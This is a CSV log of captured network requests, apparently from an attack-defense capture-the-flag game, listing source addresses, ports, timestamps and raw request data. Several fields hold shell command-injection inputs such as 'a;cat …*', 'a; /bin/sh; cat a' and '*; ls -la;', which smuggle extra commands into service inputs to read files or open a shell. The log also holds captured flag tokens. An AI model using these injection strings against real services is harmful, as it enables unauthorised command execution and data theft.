interface/src_ip/src_eth/dst_port,last_req_time,time_btw_req,all_data
tun0/10.9.12.1/undefined/10001,2022-02-19 17:41:17.986651,0,"a;echo ""==="";cat *7i6s9f9t3t9f9r1r4y9j*;echo ""==="";--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 7i6s9f9t3t9f9r1r4y9j*;aa 123--8p9j1q7t4f9t8i0a0w5g--FLGMm8fkuS0z2SIk--FLGKftbifeGRuUL--2l7z2v7j7--8p9j1q7t4f9t8i0a0w5g--FLGMm8fkuS0z2SIk--8p9j1q7t4f9t8i0a0w5g--FLGKjzGSjfVyFKU5--9u1z8f9p3k9k3q8l2m0x9k7q5v7k6q5n4e7v1p8jFLGSV35H43oYyDOk7i1k6f5n1y6m1q0y8w8m3f3t8o3t5--a; /bin/sh; cat a--cat 7i6s9f9t3t9f9r1r4y9j*--ll; cat `ls|grep 1c1i3d1r7i0k4n6e9w6m`--a; /bin/sh; cat a--cat 7i6s9f9t3t9f9r1r4y9j*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 7i6s9f9t3t9f9r1r4y9j*;aa 123--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --; cat 1c1i3d1r7i0k4n6e9w6m_*;--test; cat 7i6s9f9t3t9f9r1r4y9j*; echo--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --0w6y6b3r7v7m4v3a9j3d--*; ls -la;--ll; cat `ls|grep 1c1i3d1r7i0k4n6e9w6m`--2i0q4c0g8d0h7u7q5r0i--*; ls -la;--a;cat 7i6s9f9t3t9f9r1r4y9j*;aa 123--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --7i6s9f9t3t9f9r1r4y9j--2 a;ls | grep 7i6s9f9t3t9f9r1r4y9j;  --*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 some;cat 7i6s9f9t3t9f9r1r4y9j*;echo;  3 --a;cat 7i6s9f9t3t9f9r1r4y9j*;aa 123--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 7i6s9f9t3t9f9r1r4y9j*;aa 123--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --7i6s9f9t3t9f9r1r4y9j*;--7i6s9f9t3t9f9r1r4y9j*;--1w0x6y8v8j5z7b0b2l6t--0u5l2d1k9y1f4v6c6z6u--of6QHMWZXJ--a;cat 7i6s9f9t3t9f9r1r4y9j*;aa 123--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --7i6s9f9t3t9f9r1r4y9j--*; ls -la;--2 7i6s9f9t3t9f9r1r4y9j*;  3--a; /bin/sh; cat a--cat 7i6s9f9t3t9f9r1r4y9j*--cat 7i6s9f9t3t9f9r1r4y9j*--a; /bin/sh; cat a--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --3l0m1f7g6r6g5z8b5k4o--FLGtiT2x1dcIdoRX--FLGGIxhLpRZWiz9--2o4a0c6v5--3l0m1f7g6r6g5z8b5k4o--FLGtiT2x1dcIdoRX--3l0m1f7g6r6g5z8b5k4o--FLGYgdsCmQZd6SoP--3g9h0m5d6u4p6u1j8c5c9o4a0c4v8w3w3m3w6k8mFLGk5E7WQ3ZGJ4if0k0v8d0o1t8m8r8f7w6s5j3s9m8w6--test; cat 7i6s9f9t3t9f9r1r4y9j*; echo--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 7i6s9f9t3t9f9r1r4y9j*;aa 123--; cat 7i6s9f9t3t9f9r1r4y9j_*;--ll; cat `ls|grep 7i6s9f9t3t9f9r1r4y9j`--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a; /bin/sh; cat a--cat 1w0x6y8v8j5z7b0b2l6t*--a;echo ""==="";cat *1w0x6y8v8j5z7b0b2l6t*;echo ""==="";--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 1w0x6y8v8j5z7b0b2l6t*;aa 123--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --6y3b2t6d3r6o4k2d6e6m--FLGhInoQWRHS1zGb--FLGYOFvcvjc3iZ3--5x6h4h4j3--6y3b2t6d3r6o4k2d6e6m--FLGhInoQWRHS1zGb--6y3b2t6d3r6o4k2d6e6m--FLGISiYXfyqOWhX6--0i2y4o2c8a7y7q2v5k4x6h9r9p4j3u0v0k8x3x6gFLGQnpuJfjk4wHkX7x3s4x3u5s1v1f6l3p8t7s3s5w4u7--;cat *;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --ll; cat `ls|grep 7i6s9f9t3t9f9r1r4y9j`--a;echo ""==="";cat *1w0x6y8v8j5z7b0b2l6t*;echo ""==="";--0w6y6b3r7v7m4v3a9j3d--*; ls -la;--a;cat 1w0x6y8v8j5z7b0b2l6t*;aa 123--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 1w0x6y8v8j5z7b0b2l6t;  --1w0x6y8v8j5z7b0b2l6t--0u5l2d1k9y1f4v6c6z6u--1w0x6y8v8j5z7b0b2l6t--*; ls -la;--2i0q4c0g8d0h7u7q5r0i--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --somename somepwd 1 10 file /tmp/abcd 2 1w0x6y8v8j5z7b0b2l6t *--a;cat 1w0x6y8v8j5z7b0b2l6t*;aa 123--a;echo ""==="";cat *1w0x6y8v8j5z7b0b2l6t*;echo ""==="";--;cat *;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2q3x3r1e2c5r6d4p0o9y--FLGvbrQu76FP605m--FLGjhZQkG6XB3Db--2q3x3r1e2c5r6d4p0o9y--7b5z7l7u2--FLGvbrQu76FP605m--2q3x3r1e2c5r6d4p0o9y--9u6s2u2i8x0h9s8s0i2o4n1d8h1s2z8u5k8x1p7bFLGBQEtoydAvXVMF0w0v2o8t7p2u0k6c9q1c0f4k2q2b8--FLGrMnglPJxOvl39--a;echo ""==="";cat *1w0x6y8v8j5z7b0b2l6t*;echo ""==="";--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 1w0x6y8v8j5z7b0b2l6t*;aa 123--test; cat 1w0x6y8v8j5z7b0b2l6t*; echo--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;echo ""==="";cat *1w0x6y8v8j5z7b0b2l6t*;echo ""==="";--a;cat 1w0x6y8v8j5z7b0b2l6t*;aa 123--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --1w0x6y8v8j5z7b0b2l6t--*; ls -la;--2 a;ls | grep 1w0x6y8v8j5z7b0b2l6t;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 1w0x6y8v8j5z7b0b2l6t*;aa 123--cat 1w0x6y8v8j5z7b0b2l6t*--a; /bin/sh; cat a--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 some;cat 1w0x6y8v8j5z7b0b2l6t*;echo;  3 --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a; /bin/sh; cat a--cat 1w0x6y8v8j5z7b0b2l6t*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;cat 1w0x6y8v8j5z7b0b2l6t*;aa 123--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --1w0x6y8v8j5z7b0b2l6t*;--1w0x6y8v8j5z7b0b2l6t*;--8m3l4l3l6g9m7f1y2f6x--8m4l2n0o4g0g2f7c8j7j--a;cat 1w0x6y8v8j5z7b0b2l6t*;aa 123--jv7GeXLCqo--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --1w0x6y8v8j5z7b0b2l6t--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --0w6y6b3r7v7m4v3a9j3d--*; ls -la;"
tun0/10.9.12.1/undefined/10002,2022-02-19 17:41:18.639556,0,ipconfig
tun0/10.9.12.3/undefined/10001,2022-02-19 17:41:22.956607,0,9o7a6i9i8e5p3e7a3a4j--6z3g2v5k0y3y8x6c1l0q--6x2t2x4d4r8v0n9y2c3w--8r6e5i2z4b5x6m8b2d1g--7u4b0g9n3s0y7s2n8h6m--9i6s8w6k5k7m6y0a9b3k--7d2c2l2i5c4l6w2z5b4z--1e5h1z5f1s7h5k8g3g0e--3b5t1q7r8x5f9y9t4z0h--2h6s1k8y9o8r0i0w8a0a--7c5z5d1l5k7k5v5y8s7i--9g3x4o0z8x0q6w6k8r6z--2f4f6u9j6x5m2t4o2v4b--9u4z3y6n2o0x2v8d5r0p--8j3v7z5k5t2y0z9q1j9k--0i7c8w0d8k3c1n2l3x1d--8x7x3l9i0r4n1n0k9g5j--6q4p2i7l5m8x5q7m0t8b--0t3i1v3n1r5w8i5t2w7k--5m5l9j4z8u3f0e3w2b9k--4p4s0g4y7w7k1g3s7x2f--3l4v2m3a0w1f8e5i5i6q--0f8v7j3f3l8a1a6d0b8v--6c2p9e7a4c8f1z0j5v8o
tun0/10.9.12.1/undefined/10004,2022-02-19 17:41:28.324404,0,1892708031 wlYporY2pgSzZ8pO0Qob--ca-- cat 1892708031--1 aaaa bbbb--ca--cat 1892708031--1 aaaa bbbb--ca--976029829 4rNf7BJQ6lYWR83ZBAmX FLGzR6BbEPMCYH4h--2698904024 5UZP4VxQp5vvh2N4ZZAl FLGN3KWllTuFNnoA--2698904024 apSHq2o8JSHF4yLKJBz3--2698904024 5UZP4VxQp5vvh2N4ZZAl-- cat 1892708031--ca--779383335 puYmTIQE3nlIT0wSm4Ph FLGParIVxi9Vunaz--779383335 0m2z6qHX3WHy2RlS4thA--779383335 puYmTIQE3nlIT0wSm4Ph--2709491481 LJigcGHrd4KrLj6eNqpL FLGPcjIrGd3WuWBk--2709491481 4vFxeddS3nVjUK60TOyT--2709491481 LJigcGHrd4KrLj6eNqpL--976029829 4rNf7BJQ6lYWR83ZBAmX--ca--1 aaaa bbbb--ca--cat 1892708031--1 aaaa bbbb--ca--cat 1892708031--ca-- cat 976029829--1779671997 M3oUGoUad6U9Zn0IkISZ FLGuZuJJsr9jtr4k--1 aaaa bbbb--ca--cat 976029829--1 aaaa bbbb--cat 976029829--ca
tun0/10.9.12.3/undefined/10004,2022-02-19 17:42:10.386549,0,ca--8675309 a a--ca--8675309 a a--ca--cat 2092557619--8675309 a a--ca--cat 1368494786--8675309 a a--ca--cat 1129596835--8675309 a a--ca--cat 2979584347--8675309 a a--ca--cat 3822521945--8675309 a a--ca--cat 2287921196--8675309 a a--ca--cat 1323794066--8675309 a a--ca--cat 2555496373--8675309 a a--ca--cat 685118307--8675309 a a--ca--cat 3843716798--8675309 a a--ca--cat 1618099477--8675309 a a--ca--cat 1276629385--8675309 a a--ca--cat 3924881204--8675309 a a--ca--cat 3937570032--8675309 a a--ca--cat 593937884--8675309 a a--ca--cat 1098843889--8675309 a a--ca--cat 1639599547--8675309 a a--ca--cat 85386292--8675309 a a--ca--cat 10829100--8675309 a a--ca--cat 3775850628--8675309 a a--ca--8675309 a a--ca--cat 1273916206--8675309 a a--ca--cat 483739187--8675309 a a--ca--cat 2226372654--8675309 a a--ca--cat 2830638191--8675309 a a--ca--cat 1909190263--8675309 a a--ca--cat 344574072--8675309 a a--ca--cat 2311111931--8675309 a a--ca--cat 574257670--8675309 a a--ca--cat 379885245--8675309 a a--ca--cat 473900070--8675309 a a--ca--cat 2829209885--8675309 a a--ca--cat 1166862631--8675309 a a--ca--cat 798120628--8675309 a a--ca--cat 2729903462--8675309 a a--ca--cat 1891617765--8675309 a a--ca--cat 770095198--8675309 a a--8675309 a a--ca--cat 1614023546--8675309 a a--ca--cat 973067037--8675309 a a--ca--cat 1304431345--8675309 a a--ca--cat 441310257--8675309 a a--ca--cat 1707064465--8675309 a a--ca--cat 173022534--8675309 a a--ca--cat 2293403624--8675309 a a--ca--8675309 a a--ca--cat 4120108865--8675309 a a--ca--cat 483739187--8675309 a a--ca--cat 2226372654--8675309 a a
